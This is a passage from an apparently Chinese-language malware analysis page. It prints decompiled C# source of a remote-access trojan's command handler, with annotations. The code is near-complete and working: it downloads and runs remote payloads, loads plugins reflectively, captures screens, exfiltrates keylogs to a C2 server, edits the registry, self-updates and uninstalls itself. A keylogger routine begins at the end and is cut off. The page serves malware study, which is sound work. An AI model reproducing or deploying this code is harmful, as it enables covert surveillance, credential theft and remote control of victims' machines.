</span><span style="--0:#BD976A;--1:#B07D48">RuntimeHelpers</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetObjectValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Plugin</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">pluginData</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">A</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">H</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">H</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">P</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">P</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateSet</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">c</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 异常处理：插件相关指令出错则清空插件，向C2反馈错误信息</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">></span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">&#x26;&#x26;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Ex</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">||</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">PLG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">ER</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}{</span><span style="--0:#C98A7D;--1:#B56959">ex</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Message</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 回传错误信息到C2</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="public static void Ind(byte[] b){    // 1. 前置处理：解密/解码字节数组b，按分隔符OK.Y拆分为指令参数数组    string[] array = Strings.Split(OK.BS(ref b), OK.Y, -1, 0);    checked    {        try        {            string cmdType = array[0]; // 指令类型（核心标识）            // ========== 指令分支1：ll - 断开C2连接 ==========            if (Operators.CompareString(cmdType, &#x22;ll&#x22;, false) == 0)            {                OK.Cn = false; // 标记C2连接断开（RC函数会检测该标记并重连）            }            // ========== 指令分支2：kl - 回传日志数据 ==========            else if (Operators.CompareString(cmdType, &#x22;kl&#x22;, false) == 0)            {                // OK.ENB：加密/编码日志数据；OK.Send：向C2回传数据                OK.Send(&#x22;kl&#x22; + OK.Y + OK.ENB(ref OK.kq.Logs));            }            // ========== 指令分支3：prof - 注册表操作（写入/读取/删除） ==========            else if (Operators.CompareString(cmdType, &#x22;prof&#x22;, false) == 0)            {                string subCmd = array[1];                if (subCmd == &#x22;~&#x22;) // 子指令~：写入注册表                {                    // 调用之前分析的STV函数，写入注册表键值（类型1=String）                    OK.STV(array[2], array[3], 1);                }                else if (subCmd == &#x22;!&#x22;) // 子指令!：写入+读取注册表并回传                {                    OK.STV(array[2], array[3], 1);                    // OK.GTV：读取注册表值；回传读取结果到C2                    OK.Send($&#x22;getvalue{OK.Y}{array[1]}{OK.Y}{OK.GTV(array[1], &#x22;&#x22;)}&#x22;);                }                else if (subCmd == &#x22;@&#x22;) // 子指令@：删除注册表值                {                    OK.DLV(array[2]); // DLV=Delete Registry Value，删除指定注册表项                }            }            // ========== 指令分支4：rn - 远程下载并执行文件（核心恶意行为） ==========            else if (Operators.CompareString(cmdType, &#x22;rn&#x22;, false) == 0)            {                byte[] fileData;                // 场景1：array[2]首字符是\u001f（自定义标记），从字节数组中提取加密数据并解压                if (array[2][0] == &#x27;\u001f&#x27;)                {                    try                    {                        MemoryStream ms = new MemoryStream();                        int skipLen = (array[0] + OK.Y + array[1] + OK.Y).Length;                        ms.Write(b, skipLen, b.Length - skipLen);                        fileData = OK.ZIP(ms.ToArray()); // ZIP=解压/解密数据                    }                    catch                    {                        OK.Send(&#x22;MSG&#x22; + OK.Y + &#x22;Execute ERROR&#x22;); // 向C2反馈执行失败                        OK.Send(&#x22;bla&#x22;);                        return;                    }                }                // 场景2：从远程URL下载文件（WebClient下载）                else                {                    WebClient wc = new WebClient();                    try                    {                        fileData = wc.DownloadData(array[2]); // 下载恶意文件                    }                    catch                    {                        OK.Send(&#x22;MSG&#x22; + OK.Y + &#x22;Download ERROR&#x22;);                        OK.Send(&#x22;bla&#x22;);                        return;                    }                }                OK.Send(&#x22;bla&#x22;); // 固定反馈，用于心跳/确认                // 将恶意文件写入临时目录，命名为“随机临时文件.参数后缀”                string tempPath = Path.GetTempFileName() + &#x22;.&#x22; + array[1];                try                {                    File.WriteAllBytes(tempPath, fileData); // 写入恶意文件                    Process.Start(tempPath); // 执行文件（如木马、勒索程序、挖矿程序）                    OK.Send($&#x22;MSG{OK.Y}Executed As {new FileInfo(tempPath).Name}&#x22;); // 反馈执行成功                }                catch (Exception ex)                {                    OK.Send($&#x22;MSG{OK.Y}Execute ERROR {ex.Message}&#x22;); // 反馈执行失败                }            }            // ========== 指令分支5：inv - 加载恶意插件并执行 ==========            else if (Operators.CompareString(cmdType, &#x22;inv&#x22;, false) == 0)            {                // 从注册表读取插件数据（无数据则返回空字节数组）                byte[] pluginData = (byte[])OK.GTV(array[1], new byte[0]);                // 无插件数据且参数长度不足：向C2反馈异常                if (array[3].Length < 10 &#x26;&#x26; pluginData.Length == 0)                {                    OK.Send($&#x22;pl{OK.Y}{array[1]}{OK.Y}1&#x22;);                }                else                {                    // 参数长度足够：从字节数组提取并解压插件数据，写入注册表存储                    if (array[3].Length > 10)                    {                        MemoryStream ms = new MemoryStream();                        int skipLen = $&#x22;{array[0]}{OK.Y}{array[1]}{OK.Y}{array[2]}{OK.Y}&#x22;.Length;                        ms.Write(b, skipLen, b.Length - skipLen);                        pluginData = OK.ZIP(ms.ToArray());                        OK.STV(array[1], pluginData, 3); // 3=Binary类型，写入注册表                    }                    OK.Send($&#x22;pl{OK.Y}{array[1]}{OK.Y}0&#x22;); // 反馈插件加载准备完成                    // 加载插件（OK.Plugin：反射加载插件程序集）                    object plugin = RuntimeHelpers.GetObjectValue(OK.Plugin(pluginData, &#x22;A&#x22;));                    // 反射设置插件参数（H/P/osk：混淆变量，可能是C2地址/端口/密钥）                    NewLateBinding.LateSet(plugin, null, &#x22;h&#x22;, new object[] { OK.H }, null, null);                    NewLateBinding.LateSet(plugin, null, &#x22;p&#x22;, new object[] { OK.P }, null, null);                    NewLateBinding.LateSet(plugin, null, &#x22;osk&#x22;, new object[] { array[2] }, null, null);                    // 启动插件（执行插件的start方法）                    NewLateBinding.LateCall(plugin, null, &#x22;start&#x22;, new object[0], null, null, null, true);                    // 循环等待插件执行完成/连接断开                    while (!(!OK.Cn || (NewLateBinding.LateGet(plugin, null, &#x22;Off&#x22;, new object[0], null, null, null) == true)))                    {                        Thread.Sleep(1);                    }                    // 停止插件                    NewLateBinding.LateSet(plugin, null, &#x22;off&#x22;, new object[] { true }, null, null);                }            }            // ========== 指令分支6：ret - 加载插件并回传执行结果 ==========            else if (Operators.CompareString(cmdType, &#x22;ret&#x22;, false) == 0)            {                byte[] pluginData = (byte[])OK.GTV(array[1], new byte[0]);                if (array[2].Length < 10 &#x26;&#x26; pluginData.Length == 0)                {                    OK.Send($&#x22;pl{OK.Y}{array[1]}{OK.Y}1&#x22;);                }                else                {                    // 提取并解压插件数据，写入注册表                    if (array[2].Length > 10)                    {                        MemoryStream ms = new MemoryStream();                        int skipLen = $&#x22;{array[0]}{OK.Y}{array[1]}{OK.Y}&#x22;.Length;                        ms.Write(b, skipLen, b.Length - skipLen);                        pluginData = OK.ZIP(ms.ToArray());                        OK.STV(array[1], pluginData, 3);                    }                    OK.Send($&#x22;pl{OK.Y}{array[1]}{OK.Y}0&#x22;);                    // 加载插件并调用GT方法获取结果，加密后回传C2                    object plugin = RuntimeHelpers.GetObjectValue(OK.Plugin(pluginData, &#x22;A&#x22;));                    string pluginResult = Conversions.ToString(NewLateBinding.LateGet(plugin, null, &#x22;GT&#x22;, new object[0], null, null, null));                    OK.Send($&#x22;ret{OK.Y}{array[1]}{OK.Y}{OK.ENB(ref pluginResult)}&#x22;);                }            }            // ========== 指令分支7：CAP - 屏幕截图并回传（免重复截图） ==========            else if (Operators.CompareString(cmdType, &#x22;CAP&#x22;, false) == 0)            {                // 获取屏幕分辨率，创建位图（截图画布）                int screenWidth = Screen.PrimaryScreen.Bounds.Width;                int screenHeight = Screen.PrimaryScreen.Bounds.Height;                Bitmap fullScreenshot = new Bitmap(screenWidth, screenHeight);                Graphics g = Graphics.FromImage(fullScreenshot);                // 截取整个屏幕                g.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));                // 尝试绘制鼠标光标（提升截图完整性）                try                {                    Cursor.Default.Draw(g, new Rectangle(Cursor.Position, new Size(32, 32)));                }                catch { }                g.Dispose();                // 按参数缩放截图（array[1]=宽度，array[2]=高度）                Bitmap scaledScreenshot = new Bitmap(int.Parse(array[1]), int.Parse(array[2]));                g = Graphics.FromImage(scaledScreenshot);                g.DrawImage(fullScreenshot, 0, 0, scaledScreenshot.Width, scaledScreenshot.Height);                g.Dispose();                // 处理截图：避免重复回传（MD5对比lastcap）                MemoryStream ms = new MemoryStream();                MemoryStream jpegMs = new MemoryStream();                scaledScreenshot.Save(jpegMs, ImageFormat.Jpeg);                string screenshotMd5 = OK.md5(jpegMs.ToArray());                // 截图不同则回传，相同则仅传空标记                if (screenshotMd5 != OK.lastcap)                {                    OK.lastcap = screenshotMd5;                    ms.Write(OK.SB(ref $&#x22;CAP{OK.Y}&#x22;), 0, b.Length); // 拼接标识                    ms.Write(jpegMs.ToArray(), 0, (int)jpegMs.Length);                }                else                {                    ms.WriteByte(0);                }                OK.Sendb(ms.ToArray()); // 二进制回传截图数据到C2                // 清理资源（避免内存泄漏）                ms.Dispose(); jpegMs.Dispose(); fullScreenshot.Dispose(); scaledScreenshot.Dispose();            }            // ========== 指令分支8：un - 自操作（卸载/退出/重启） ==========            else if (Operators.CompareString(cmdType, &#x22;un&#x22;, false) == 0)            {                string subCmd = array[1];                if (subCmd == &#x22;~&#x22;) OK.UNS(); // UNS：自卸载（删除自身文件/注册表痕迹）                else if (subCmd == &#x22;!&#x22;) // 强制退出                {                    OK.pr(0); // 清理进程资源                    ProjectData.EndApp(); // 终止程序                }                else if (subCmd == &#x22;@&#x22;) // 重启自身                {                    OK.pr(0);                    Process.Start(OK.LO.FullName); // 启动恶意程序副本                    ProjectData.EndApp(); // 终止当前进程                }            }            // ========== 指令分支9：up - 自更新（下载新版本恶意程序） ==========            else if (Operators.CompareString(cmdType, &#x22;up&#x22;, false) == 0)            {                byte[] updateData;                // 场景1：从字节数组提取加密更新包                if (array[1][0] == &#x27;\u001f&#x27;)                {                    try                    {                        MemoryStream ms = new MemoryStream();                        int skipLen = $&#x22;{array[0]}{OK.Y}&#x22;.Length;                        ms.Write(b, skipLen, b.Length - skipLen);                        updateData = OK.ZIP(ms.ToArray());                    }                    catch                    {                        OK.Send(&#x22;MSG&#x22; + OK.Y + &#x22;Update ERROR&#x22;);                        OK.Send(&#x22;bla&#x22;);                        return;                    }                }                // 场景2：从远程URL下载更新包                else                {                    WebClient wc = new WebClient();                    try                    {                        updateData = wc.DownloadData(array[1]);                    }                    catch                    {                        OK.Send(&#x22;MSG&#x22; + OK.Y + &#x22;Update ERROR&#x22;);                        OK.Send(&#x22;bla&#x22;);                        return;                    }                }                OK.Send(&#x22;bla&#x22;);                string tempExe = Path.GetTempFileName() + &#x22;.exe&#x22;; // 临时更新文件                try                {                    OK.Send($&#x22;MSG{OK.Y}Updating To {new FileInfo(tempExe).Name}&#x22;);                    Thread.Sleep(2000); // 延迟规避检测                    File.WriteAllBytes(tempExe, updateData); // 写入新恶意程序                    Process.Start(tempExe, &#x22;..&#x22;); // 启动新版本                }                catch (Exception ex)                {                    OK.Send($&#x22;MSG{OK.Y}Update ERROR {ex.Message}&#x22;);                }                OK.UNS(); // 卸载旧版本            }            // ========== 指令分支10：Ex - 转发指令到已加载的插件 ==========            else if (Operators.CompareString(cmdType, &#x22;Ex&#x22;, false) == 0)            {                if (OK.PLG == null) // 无插件则等待加载                {                    OK.Send(&#x22;PLG&#x22;);                    int waitCount = 0;                    while (OK.PLG == null &#x26;&#x26; waitCount < 20 &#x26;&#x26; OK.Cn)                    {                        waitCount++;                        Thread.Sleep(1000);                    }                    if (OK.PLG == null || !OK.Cn) return;                }                // 反射调用插件的ind方法，转发指令字节数组                object[] args = new object[] { b };                bool[] isRef = new bool[] { true };                NewLateBinding.LateCall(OK.PLG, null, &#x22;ind&#x22;, args, null, null, isRef, true);                // 接收插件返回的字节数组                if (isRef[0]) b = (byte[])args[0];            }            // ========== 指令分支11：PLG - 加载恶意插件（扩展功能） ==========            else if (Operators.CompareString(cmdType, &#x22;PLG&#x22;, false) == 0)            {                // 提取并解压插件数据                MemoryStream ms = new MemoryStream();                int skipLen = $&#x22;{array[0]}{OK.Y}&#x22;.Length;                ms.Write(b, skipLen, b.Length - skipLen);                byte[] pluginData = OK.ZIP(ms.ToArray());                // 加载插件并设置核心参数（C2连接、地址、端口）                OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(pluginData, &#x22;A&#x22;));                NewLateBinding.LateSet(OK.PLG, null, &#x22;H&#x22;, new object[] { OK.H }, null, null);                NewLateBinding.LateSet(OK.PLG, null, &#x22;P&#x22;, new object[] { OK.P }, null, null);                NewLateBinding.LateSet(OK.PLG, null, &#x22;c&#x22;, new object[] { OK.C }, null, null);            }        }        catch (Exception ex)        {            // 异常处理：插件相关指令出错则清空插件，向C2反馈错误信息            if (array.Length > 0 &#x26;&#x26; (array[0] == &#x22;Ex&#x22; || array[0] == &#x22;PLG&#x22;)) OK.PLG = null;            try            {                OK.Send($&#x22;ER{OK.Y}{array[0]}{OK.Y}{ex.Message}&#x22;); // 回传错误信息到C2            }            catch { }        }    }}"><div></div></button></div></figure></div>
</li>
</ul>
<h3 id="3-间谍行为wrk-与-inf">3. 间谍行为：WRK() 与 Inf()<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 3. 间谍行为：WRK() 与 Inf()" data-pagefind-ignore="" href="#3-间谍行为wrk-与-inf">#</a></h3>
<ul>
<li><strong><code>WRK()</code> (Keylogger)</strong>: 利用 <code>GetAsyncKeyState</code> API 轮询键盘状态，记录用户输入的所有账号密码和聊天记录。</li>
</ul>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">public</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">void</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">WRK</span><span style="--0:#666666;--1:#999999">()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 初始化：从注册表读取历史键盘日志（this.vn是注册表键名，OK.GTV=读取注册表值）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Logs</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GTV</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C99076;--1:#A65E2B">this</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">vn</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">));</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">checked</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 启用溢出检查，避免日志拼接时内存溢出导致程序崩溃</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">loopCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 循环计数器，用于定期清理/存储日志</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 核心无限循环：永不退出，持续监听按键</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">for</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(;;)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">loopCount</span><span style="--0:#CB7676;--1:#AB5959">++</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">keyCode</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 按键码（0-255覆盖所有常用键盘按键）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">do</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 核心：检测按键是否被按下 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// kl.GetAsyncKeyState(num2)：检测指定按键码的按键状态（-32767=按下）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// !OK.F.Keyboard.CtrlKeyDown：排除Ctrl键按下的场景（避免误记录快捷键/规避检测）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">kl</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetAsyncKeyState</span><span 